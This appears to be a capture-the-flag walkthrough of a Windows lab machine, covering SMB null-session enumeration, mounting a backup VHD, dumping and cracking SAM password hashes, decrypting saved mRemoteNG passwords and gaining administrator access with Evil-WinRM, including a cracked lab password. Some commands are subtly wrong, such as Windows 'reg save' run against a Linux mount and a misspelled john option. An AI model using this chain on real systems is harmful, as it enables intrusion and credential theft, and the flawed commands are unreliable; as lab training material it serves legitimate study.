**Skills Required**
● Enumeration
**Skills Learned**
● Extracting passwords from SAM
● Exploiting MRemoteNG

SMB Exploitation, Enumerating SMB Shares, VHD Exploration, Exploiting mRemoteNG, Access via Evil-WinRM

---------------------

### SMB Exploitation and Privilege Escalation Tutorial

#### Step 1: Initial Reconnaissance
1. **Port Scanning**: We start by identifying port 445 as an open SMB port on the target IP. SMB (Server Message Block) is a network file sharing protocol.

#### Step 2: Enumerating SMB Shares
1. **Using crackmapexec**: CrackMapExec is a tool used for penetration testing around Active Directory environments. To list available SMB shares, use the following command:
   
   ```bash
   crackmapexec smb ip
   ```

#### Step 3: Null Session Exploitation
1. **Listing Shares with Null Session**: We can exploit a null session to list the shared resources on the target using smbclient:
   
   ```bash
   smbclient -L IP -N
   ```

2. **Viewing Read Permissions**: To see read permissions using smbmap:
   
   ```bash
   smbmap -H IP -u 'null'
   ```

3. **Accessing Backups**: We identify the ability to read and write to backups using smbclient:
   
   ```bash
   smbclient //IP/Backups -N
   ```

#### Step 4: Mounting and Exploring Resources
1. **Creating a Mount Point**: Create a directory for mounting SMB shares:
   
   ```bash
   mkdir /mnt/smb
   ```

2. **Mounting the Share**: Use the `mount` command to mount the share to the mount point:
   
   ```bash
   mount -t cifs //IP/Backups /mnt/smb
   ```

3. **Exploring the Mounted Share**: Navigate to the mounted directory and use the `tree` command to see its contents:
   
   ```bash
   cd /mnt/smb
   tree
   ```

#### Step 5: VHD (Virtual Hard Drive) Exploration
1. **Loading Kernel Module**: Load the kernel module "nbd" to work with virtual hard drives:
   
   ```bash
   modprobe nbd
   ```

2. **Identify NBD Device**: Use the `ls` command to find the /dev/nbdX device to use:
   
   ```bash
   ls /dev
   ```

3. **Using qemu-nbd**: Use qemu-nbd to access the content of a VHD file:
   
   ```bash
   qemu-nbd -r -c /dev/nbd0 "/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cf.....963.vhd"
   ```

4. **Mounting VHD Partition**: Mount the partition using the nbd device:
   
   ```bash
   mount /dev/nbd0p1 /mnt/vhd
   ```

#### Step 6: Extracting Hashes and Cracking Passwords
1. **Navigate to System and SAM Registries**: Go to the Windows registry directory:
   
   ```bash
   cd /mnt/vhd/Windows/System32/config
   ```

2. **Backup Registries**: Backup the SAM and SYSTEM hives:
   
   ```bash
   reg save HKLM/system system.backup | reg save HKLM/sam sam.backup
   ```

3. **Extracting Hashes**: Use "secretsdump" to extract hashes:
   
   ```bash
   secretsdump -sam SAM -system SYSTEM LOCAL
   ```

4. **Cracking Hashes**: Crack the hashes using a tool like John the Ripper:
   
   ```bash
   john --wordlists=../../wordlist/rockyou.txt hash --format=NT
   bureaulampje     (L4mpje)
   ```

#### Step 7: Privilege Escalation and Access
1. **Connecting via SSH**: Connect using SSH using the obtained credentials:
   
   ```bash
   sshpass -p 'bureaulampje' ssh L4mpje@IP
   ```
900a036bef67206e315dacd62902c1ee
2. **Privilege Escalation Information**: Gather privilege escalation information:
   
   ```bash
   whoami /priv
   whoami /all
   systeminfo
   tasklist
   ```

#### Step 8: Exploiting mRemoteNG
1. **Locate Configuration Files**: Find mRemoteNG configuration files:
   
   ```bash
   cd C:\Users\L4mpje\AppData\Roaming\mRemoteNG
   type confCons.xml
   ```

2. **Decrypting Passwords**: Use "mremoteng_decrypt.py" to decrypt passwords:
   
   ```bash
   python3 mremoteng_decrypt.py -s 'PASSWORD'
   ```

3. **Validating Decrypted Password**: Use the decrypted password with crackmapexec:
   
   ```bash
   crackmapexec smb IP -u 'Administrator' -p 'password'
   ```

4. **Access via Evil-WinRM**: If successful, use evil-winrm to access the machine:
   
   ```bash
   evil-winrm -i IP -u 'Administrator' -p 'passwd'
   ```

#### Step 9: Finding Flags
1. **Locate User Flag**: Explore the user's desktop for the user flag.
3. **Find and Collect Root Flag**: Locate the root flag to complete the challenge.
